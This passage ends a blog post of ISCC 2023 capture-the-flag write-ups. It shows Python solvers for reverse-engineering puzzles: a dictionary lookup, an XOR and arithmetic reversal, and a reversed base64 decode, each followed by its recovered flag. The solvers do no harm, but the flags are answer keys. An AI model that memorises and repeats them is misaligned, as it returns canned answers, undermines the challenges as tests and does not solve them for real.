+<span class="line" data-line="16"><span style="color:#9ECBFF">       "1979386605.348865528"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"*"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3283987997.1614515444"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3248176867.998559740"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"Y"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2460099397.287946231"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"r"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="17"><span style="color:#9ECBFF">       "933728663.4036345491"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"D"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"870221498.4165280671"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"F"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"700813972.3680578651"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"!"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2666170697.1050538432"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"G"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="18"><span style="color:#9ECBFF">       "3735675442.4106461569"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"Q"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3944223761.1040972928"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"S"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"406509623.2197974953"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"-"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"166914849.75133536"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"2"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="19"><span style="color:#9ECBFF">       "1971216652.4016620168"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"B"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3126027666.2407112104"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"'"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2421050068.877129437"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"h"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2694837670.239856188"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"v"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="20"><span style="color:#9ECBFF">       "4259959222.1144992995"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"}"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1986798057.4141497725"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"0"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"734889408.680957602"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"t"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3747360752.949414639"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">">"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="21"><span style="color:#9ECBFF">       "4099300672.1926520061"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"V"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2965350987.46203785"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"K"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"428936951.1911408410"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"d"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1336447878.2775388247"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"b"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="22"><span style="color:#9ECBFF">       "4097885373.4018178710"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"&#x26;"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1935593237.368431450"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"Z"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"529156133.278213883"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"N"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2381012008.4088810995"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"R"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="23"><span style="color:#9ECBFF">       "385403258.710806366"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"g"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"4273244629.3478477188"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"H"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1802901715.704799359"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"|"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"930008935.2627182413"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"5"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="24"><span style="color:#9ECBFF">       "4018804880.2724391126"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"O"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"4067852839.2777358486"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"U"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1615466436.2634553015"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"{"</span><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="25"></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">part1 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ".406509623.1979386605.1579951362.1964704696.870221498.99771100.3872134833.1336447878.3944223761.1236282010.529156133.4075828588"</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:].split(</span><span style="color:#9ECBFF">"."</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">part2 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ".2197974953.348865528.2846238576.30454558.4165280671.1051999332.1068749546.2775388247.1040972928.4060431406.278213883.429489377"</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:].split(</span><span style="color:#9ECBFF">"."</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">flag </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">.join(dic[a </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> '.'</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> b] </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> a, b </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> zip</span><span style="color:#E1E4E8">(part1, part2))</span></span>
+<span class="line" data-line="29"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> flag[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:] </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'ANM'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="30"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"ISCC</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">flag[:</span><span style="color:#F97583">-</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">]</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="31"><span style="color:#6A737D"># ISCC-*8XF9mbS</span></span></code></pre>
+<h2 id="reverse">Reverse</h2>
+<h3 id="justdoit">JustDoIt</h3>
+<blockquote>
+<p>干就完了！</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> z3 </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">key </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'ISCC'</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">a1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#79B8FF">23</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">68</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">68</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">15</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">94</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">95</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">24</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">87</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">26</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">105</span><span style="color:#E1E4E8">]</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">):</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">    key_index </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">%</span><span style="color:#79B8FF"> 4</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">    a1[i] </span><span style="color:#F97583">^=</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(key[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">])</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">    a1[i] </span><span style="color:#F97583">-=</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(key[key_index]) </span><span style="color:#F97583">%</span><span style="color:#79B8FF"> 5</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">    a1[i] </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(key[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">%</span><span style="color:#79B8FF"> 6</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(key[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">//</span><span style="color:#79B8FF"> 6</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">    a1[i] </span><span style="color:#F97583">-=</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(key[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">//</span><span style="color:#79B8FF"> 7</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(key[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">%</span><span style="color:#79B8FF"> 7</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    a1[i] </span><span style="color:#F97583">-=</span><span style="color:#E1E4E8"> i</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">    a1[i] </span><span style="color:#F97583">+=</span><span style="color:#79B8FF"> 60</span></span>
+<span class="line" data-line="14"></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">result </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">.join(</span><span style="color:#79B8FF">chr</span><span style="color:#E1E4E8">(x) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> x </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> a1)</span></span>
+<span class="line" data-line="16"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(result)</span></span>
+<span class="line" data-line="17"><span style="color:#6A737D"># ISCC{Just~Do~It}</span></span></code></pre>
+<h3 id="变形记">变形记</h3>
+<blockquote>
+<p>Mr.String竟然来报名变形记，但他没叫Mr.Num，拭目以待！</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> base64 </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> b64decode</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">secret </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "=IjdzZXUzlnMVFmMCN3Y6FVVzF1c"</span></span>
+<span class="line" data-line="4"></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">decoded_secret </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> b64decode(secret[::</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]).decode()</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">flag </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
+<span class="line" data-line="7"></span>
+<span class="line" data-line="8"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i, char </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> enumerate</span><span style="color:#E1E4E8">(decoded_secret):</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    if</span><span style="color:#F97583"> not</span><span style="color:#E1E4E8"> char.isdigit():</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">        flag.append(char)</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">        flag.append(decoded_secret[i</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(char) </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">))</span></span>
+<span class="line" data-line="13"></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">result </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">.join(flag)</span></span>
+<span class="line" data-line="15"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"ISCC</span><span style="color:#79B8FF">{{{</span><span style="color:#E1E4E8">result</span><span style="color:#79B8FF">}}}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="16"><span style="color:#6A737D"># ISCC{sQsUQzcsBBaUUysQvsvv}</span></span></code></pre>
+<h3 id="奇门遁甲">奇门遁甲</h3>
+<p>依次输入 <code>31284567</code> 会依次得到一段 flag，最后拼到一起即可得到 flag</p>   </section> <footer class="mt-12 pt-8 border-t border-gray-200 dark:border-gray-700"> <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-lg text-sm text-gray-700 dark:text-gray-300 space-y-2 relative overflow-hidden transition-colors duration-300">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none text-gray-600 dark:text-gray-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="currentColor" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10 space-y-2"> <div> <strong>本文作者：</strong> <span>iami233</span> </div> <div> <strong>本文链接：</strong> <a href="https://5ime.cn/iscc-2023/index.html" target="_blank" rel="noopener" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 break-all transition-colors duration-300"> https://5ime.cn/iscc-2023/index.html </a> </div> <div> <strong>版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/cn/" target="_blank" rel="noopener noreferrer" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 transition-colors duration-300">
+CC BY-NC-SA 4.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" class="transition-colors duration-300"></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.DMKo1lxI.js"></script>  </div> <div id="custom-lightbox" class="lightbox" style="display: none;" data-astro-cid-vqtgpguw>  <div id="lightbox-images" data-astro-cid-vqtgpguw></div> <div class="toolbar" data-astro-cid-vqtgpguw> <div class="counter" data-astro-cid-vqtgpguw> <span data-astro-cid-vqtgpguw><b id="current" data-astro-cid-vqtgpguw>1</b>/<span id="total" data-astro-cid-vqtgpguw>0</span></span> </div> <div class="nav" data-astro-cid-vqtgpguw> <div class="btn" id="prev" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M31 36L19 24L31 12" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> <div class="btn" id="next" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M19 12L31 24L19 36" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> <div class="btn" id="close" data-astro-cid-vqtgpguw> <svg width="16" height="16" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M8 8L40 40M8 40L40 8" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> </div> <script type="module">class o{index=0;images=[];elements;constructor(){this.elements={lightbox:document.getElementById("custom-lightbox"),container:document.getElementById("lightbox-images"),prev:document.getElementById("prev"),next:document.getElementById("next"),close:document.getElementById("close"),current:document.getElementById("current"),total:document.getElementById("total")},this.init()}init(){this.elements.prev.onclick=()=>this.navigate(-1),this.elements.next.onclick=()=>this.navigate(1),this.elements.close.onclick=()=>this.close(),this.elements.lightbox.onclick=e=>{e.target===this.elements.lightbox&&this.close()},document.onkeydown=e=>{this.elements.lightbox.style.display==="flex"&&(e.key==="ArrowLeft"?this.navigate(-1):e.key==="ArrowRight"?this.navigate(1):e.key==="Escape"&&this.close())}}open(e,t=0){this.images=e,this.index=t,this.render(),this.elements.lightbox.style.display="flex",this.elements.lightbox.classList.remove("exit"),document.body.style.overflow="hidden"}navigate(e){const t=this.index+e;t>=0&&t<this.images.length&&(this.index=t,this.render())}render(){const{src:e,alt:t}=this.images[this.index],i=new Image;i.onload=()=>{this.elements.container.innerHTML=`<img src="${e}" alt="${t}">`;const s=this.elements.container.querySelector("img");if(window.innerWidth>768){const n=window.innerWidth*.8,l=window.innerHeight*.75;(i.naturalWidth>n||i.naturalHeight>l)&&(s.style.maxWidth=`${n}px`,s.style.maxHeight=`${l}px`)}requestAnimationFrame(()=>s.classList.add("show"))},i.src=e,this.elements.current.textContent=(this.index+1).toString(),this.elements.total.textContent=this.images.length.toString(),this.elements.prev.style.opacity=this.index===0?"0.3":"1",this.elements.next.style.opacity=this.index===this.images.length-1?"0.3":"1"}close(){this.elements.lightbox.classList.add("exit"),document.body.style.overflow="",setTimeout(()=>this.elements.lightbox.style.display="none",300)}}window.customLightbox=new o;</script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-gray-700 dark:text-gray-400" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2026 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("article");if(e&&window.customLightbox){const n=e.getElementsByTagName("img"),o=[];Array.from(n).forEach((t,a)=>{t.alt||(t.alt=`文章配图 ${a+1}`),o.push({src:t.src,alt:t.alt}),t.style.cursor="pointer",t.addEventListener("click",()=>{window.customLightbox.open(o,a)})})}});</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const o=document.querySelectorAll("[data-live-photo]");if(!o.length)return;const e=()=>{o.forEach(t=>{t.setAttribute("data-live-photo-initialized","true")})},i=()=>{const{LivePhotosKit:t}=window;try{t?.Player?.initialize()}catch(n){console.error("LivePhotosKit 初始化失败:",n)}e()};if(window.LivePhotosKit)i();else{const t=document.createElement("script");Object.assign(t,{src:"https://cdn.apple-livephotoskit.com/lpk/1/livephotoskit.js",async:!0,crossOrigin:"anonymous",onerror:()=>{console.error("LivePhotosKit 脚本加载失败"),e()},onload:()=>setTimeout(i,100)}),document.head.appendChild(t)}});</script></body></html>
